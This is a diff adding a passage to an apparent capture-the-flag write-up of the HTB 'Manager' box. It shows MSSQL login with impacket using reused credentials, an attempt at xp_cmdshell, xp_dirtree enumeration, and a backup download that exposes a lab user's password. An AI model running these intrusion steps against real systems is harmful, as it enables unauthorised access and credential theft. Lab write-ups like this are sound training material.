@@ -451,5 +451,139 @@ MSSQL       10.129.116.131  1433   DC01             [*] Windows 10 / Server 2019
 MSSQL       10.129.116.131  1433   DC01             [+] manager.htb\operator:operator
 ```
 
-We have found password reuse for the MSSQL service with the operator user. This is very dangerous.
+We have found password reuse for the MSSQL service with the operator user. This is very dangerous and if an attacker can gain access to an MSSQL database, it could even lead to code execution if the db user has a privileged account. Let's log in before testing if we can get code execution using xp_cmdshell:
+
+#### Logging into MSSQL:
+
+```
+impacket-mssqlclient manager.htb/operator:operator@10.129.116.131 -windows-auth
+```
+
+We've used Windows Authentication here because we are dealing with a domain account, rather than an SQL service user account. But I always try both, with and without this switch, just incase.
+
+Success, we have logged in. Let's list our options:
+
+#### Help options in MSSQL:
+
+```
+    lcd {path}                 - changes the current local directory to {path}
+    exit                       - terminates the server process (and this session)
+    enable_xp_cmdshell         - you know what it means
+    disable_xp_cmdshell        - you know what it means
+    enum_db                    - enum databases
+    enum_links                 - enum linked servers
+    enum_impersonate           - check logins that can be impersonated
+    enum_logins                - enum login users
+    enum_users                 - enum current db users
+    enum_owner                 - enum db owner
+    exec_as_user {user}        - impersonate with execute as user
+    exec_as_login {login}      - impersonate with execute as login
+    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+    xp_dirtree {path}          - executes xp_dirtree on the path
+    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+    ! {cmd}                    - executes a local shell cmd
+    show_query                 - show query
+    mask_query                 - mask query
+```
+
+As can be seen above, we can try to enable xp_cmdshell. Let's try that:
+
+```
+enable_xp_cmdshell
+```
+
+#### Output:
+
+```
+ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
+ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
+ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
+ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
+```
+
+Unfortunately, we do not have the privileges to enable xp_cmdshell. Let's instead try the next best approach and use xp_dirtree:
+
+```
+SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\Users
+```
+
+#### Output:
+
+```
+subdirectory    depth   file   
+-------------   -----   ----   
+Administrator       1      0   
+
+All Users           1      0   
+
+Default             1      0   
+
+Default User        1      0   
+
+Public              1      0   
+
+Raven               1      0   
+```
+
+We successfully list the Users directory on the MSSQL host machine. Snooping around reveals a website backup file in the wwwroot folder which looks promising:
+
+```
+SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
+```
+
+#### Backup file:
+
+```
+website-backup-27-07-23-old.zip
+```
+
+Because this is in the webserver root directory, we can access (and download) this file from our attacker machine:
+
+#### Downloading and unzipping website backup:
+
+```
+mkdir backup
+cd backup
+wget 10.129.116.131/website-backup-27-07-23-old.zip
+unzip website-backup-27-07-23-old.zip
+```
+
+Long listing and revealing all files leads us to discover the file .old-conf.xml:
+
+#### Listing contents:
+
+```
+ls -la
+```
+
+#### Output:
+
+```
+drwxr-xr-x  5 root         root            4096 Oct 25 10:13 .
+drwx------ 23 candidbandit candidbandit    4096 Oct 25 10:13 ..
+-rw-r--r--  1 root         root            5386 Jul 27  2023 about.html
+-rw-r--r--  1 root         root            5317 Jul 27  2023 contact.html
+drwxr-xr-x  2 root         root            4096 Oct 25 10:13 css
+drwxr-xr-x  2 root         root            4096 Oct 25 10:13 images
+-rw-r--r--  1 root         root           18203 Jul 27  2023 index.html
+drwxr-xr-x  2 root         root            4096 Oct 25 10:13 js
+-rw-r--r--  1 root         root             698 Jul 27  2023 .old-conf.xml
+-rw-r--r--  1 root         root            7900 Jul 27  2023 service.html
+-rw-r--r--  1 root         root         1045328 Jul 27  2023 website-backup-27-07-23-old.zip
+```
+
+Displaying the contents of this XML file leads to the disclosure of raven's password:
+
+```
+cat .old-conf.xml
+```
+
+#### Output:
+
+```
+ <user>raven@manager.htb</user>
+ <password>R4v3nBe5tD3veloP3r!123</password>
+```
+
 
